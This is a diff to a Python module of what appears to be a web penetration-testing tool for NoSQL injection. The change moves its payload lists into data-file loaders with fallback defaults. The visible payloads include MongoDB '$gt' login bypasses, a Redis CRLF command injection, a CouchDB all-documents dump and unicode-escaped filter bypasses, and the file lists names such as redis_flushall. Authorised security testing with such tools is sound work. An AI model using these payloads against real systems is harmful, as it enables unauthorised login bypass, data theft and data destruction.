@@ -36,7 +36,7 @@ from mytools.core.utils import (
 
 logger = logging.getLogger("mytools.nosqliinject")
 
-_CATEGORY_MAP: dict[str, list[str]] = {
+_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
     "detect": ["gt_bypass", "ne_bypass", "regex_bypass", "exists_bypass", "type_bypass"],
     "mongodb": ["mongo_gt", "mongo_ne", "mongo_where", "mongo_regex", "mongo_or", "mongo_nin", "mongo_and", "mongo_not", "mongo_mod", "mongo_exists", "mongo_type"],
     "redis": ["redis_info", "redis_config", "redis_keys", "redis_eval", "redis_flushall"],
@@ -44,7 +44,16 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "bypass": ["unicode_bypass", "double_json", "nested_bypass", "mixed_type", "array_bypass", "null_terminator"],
 }
 
-_DETECT_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
+
+def _load_category_map() -> dict[str, list[str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    return data.get("category_map", _CATEGORY_MAP_DEFAULT)
+
+
+_CATEGORY_MAP = _load_category_map()
+
+_DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "gt_bypass",
         '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
@@ -77,7 +86,16 @@ _DETECT_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     ),
 ]
 
-_MONGODB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
+
+def _load_detect_payloads() -> list[tuple[str, str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"detect_payloads": [list(t) for t in _DETECT_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("detect_payloads", [list(t) for t in _DETECT_PAYLOADS_DEFAULT])]
+
+
+_DETECT_PAYLOADS = _load_detect_payloads()
+
+_MONGODB_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "mongo_gt",
         '{"user": {"$gt": ""}, "pass": {"$gt": ""}}',
@@ -146,7 +164,16 @@ _MONGODB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     ),
 ]
 
-_REDIS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
+
+def _load_mongodb_payloads() -> list[tuple[str, str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"mongodb_payloads": [list(t) for t in _MONGODB_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("mongodb_payloads", [list(t) for t in _MONGODB_PAYLOADS_DEFAULT])]
+
+
+_MONGODB_PAYLOADS = _load_mongodb_payloads()
+
+_REDIS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "redis_info",
         "\r\nINFO\r\n",
@@ -179,7 +206,16 @@ _REDIS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     ),
 ]
 
-_COUCHDB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
+
+def _load_redis_payloads() -> list[tuple[str, str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"redis_payloads": [list(t) for t in _REDIS_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("redis_payloads", [list(t) for t in _REDIS_PAYLOADS_DEFAULT])]
+
+
+_REDIS_PAYLOADS = _load_redis_payloads()
+
+_COUCHDB_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "couchdb_alldocs",
         '{"_all_docs": true, "include_docs": true}',
@@ -212,7 +248,16 @@ _COUCHDB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     ),
 ]
 
-_BYPASS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
+
+def _load_couchdb_payloads() -> list[tuple[str, str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"couchdb_payloads": [list(t) for t in _COUCHDB_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("couchdb_payloads", [list(t) for t in _COUCHDB_PAYLOADS_DEFAULT])]
+
+
+_COUCHDB_PAYLOADS = _load_couchdb_payloads()
+
+_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "unicode_bypass",
         '{"u\\u0073ername": {"\\u0024gt": ""}}',
@@ -251,10 +296,28 @@ _BYPASS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     ),
 ]
 
-_LOGIN_PARAMS: list[str] = [
+
+def _load_bypass_payloads() -> list[tuple[str, str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT])]
+
+
+_BYPASS_PAYLOADS = _load_bypass_payloads()
+
+_LOGIN_PARAMS_DEFAULT: list[str] = [
     "user", "username", "email", "login", "name", "account",
     "pass", "password", "pwd", "secret", "auth",
 ]
+
+
+def _load_login_params() -> list[str]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "nosqliinject", default={"login_params": _LOGIN_PARAMS_DEFAULT})
+    return data.get("login_params", _LOGIN_PARAMS_DEFAULT)
+
+
+_LOGIN_PARAMS = _load_login_params()
 
 
 @dataclass(frozen=True, slots=True)
